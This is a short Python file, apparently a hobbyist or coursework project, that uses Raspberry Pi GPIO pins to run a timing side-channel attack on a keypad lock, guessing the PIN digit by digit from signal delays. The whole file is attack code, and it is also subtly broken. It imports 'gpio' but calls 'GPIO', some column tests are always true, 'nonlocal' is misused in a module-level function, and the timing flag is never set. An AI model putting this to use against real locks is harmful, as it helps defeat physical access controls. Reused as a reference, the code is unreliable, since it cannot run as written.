#-------------------------------------------------------------------------------
# Name:        Side channel code
# Purpose:  This code runs the side chanel attack. It cycles through all the numbers and waits to see if there is a delay associated with the red led turning on
#           It needs sleeps so the lock code can run
#Functions:
#       checkingnum():
#           The function that runs through all the numbers and stores each correct digit. has to go back to one after each correct digit.
#           needs to only see the load line to check if one second has passed
#       pulldown(index):
#           pulls down one of the three columns based on what index checkingnum has passed it. but first it makes sure the pi is activating the right row
#       nextload():
#           This function is an interrupt that is triggered on a rising edge, effectively telling the program
#           how long it is between loads, if this is around one second then it will return that a red light has turned on
# Author:      callum
#
# Created:     25/04/2017
# Copyright:   (c) callum 2017
# Licence:     <your licence>
#-------------------------------------------------------------------------------
import gpio
import time

onec = 9
twoc = 10
threec = 11
load = 14
enable = 15

def checkingnum():
    code = []
    indexes = []
    digits = ["1","2","3","4","5","6","7","8","9","*","0","#"]
    for i in range (4):
        index = 0
        red = True
        while red == True:
            loadrising= False
            counter = 0
            currentnum = digits[index]
            pulldown(index)
            time.sleep(10/1000)
            while loadrising == False:
                counter +=1
                time.sleep(10/1000)
            if (counter <= 20):
                red = False

            if red == True:
                for i in range (len(code)):
                    pulldown(indexes[i])

            index+=1
        code.append(currentnum)
        indexes.append(index-1)
def pulldown(index):
    if (index <= 2):
        GPIO.wait_for_edge(load, GPIO.RISING)
    elif (index <= 5):
        GPIO.wait_for_edge(load, GPIO.RISING)
        GPIO.wait_for_edge(load, GPIO.RISING)
    elif (index <= 8):
        GPIO.wait_for_edge(load, GPIO.RISING)
        GPIO.wait_for_edge(load, GPIO.RISING)
        GPIO.wait_for_edge(load, GPIO.RISING)
    if ((index == 0) or (index ==3)or(index ==6)):
        GPIO.wait_for_edge(enable, GPIO.FALLING)
        GPIO.output(onec,0)
        GPIO.output(twoc,1)
        GPIO.output(threec,1)
    elif (index == 1 or 4 or 7):
        GPIO.wait_for_edge(enable, GPIO.FALLING)
        GPIO.output(onec,1)
        GPIO.output(twoc,0)
        GPIO.output(threec,1)
    elif (index == 2 or 5 or 8):
        GPIO.wait_for_edge(enable, GPIO.FALLING)
        GPIO.output(onec,1)
        GPIO.output(twoc,1)
        GPIO.output(threec,0)


def next_load():
    nonlocal loadrising
    loadrising = True
    return loadrising
